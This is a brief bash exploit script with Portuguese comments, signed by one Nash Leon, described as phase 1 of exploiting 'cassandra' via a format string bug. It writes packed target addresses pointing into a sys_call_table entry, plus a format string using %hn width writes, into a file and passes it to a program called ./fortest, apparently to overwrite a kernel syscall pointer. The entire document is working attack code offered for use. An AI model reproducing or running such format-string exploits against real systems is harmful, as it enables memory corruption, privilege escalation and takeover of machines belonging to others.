#!/bin/bash
#Shellscript para Fase 1 na exploitacao
#de cassandra via format string bug.
#Nash Leon - nashleon@yahoo.com.br
#
#RETLOC = 0xc0448b38 (sys_call_table + 238 * 4)
#RETADD = 0x01001000 (- 8 bytes)

printf "\x35\x8b\x44\xc0\x38\x8b\x44\xc0" > fmt
echo -n "%.16781304u%hn%.12345u%hn" >> fmt
./fortest `cat fmt`


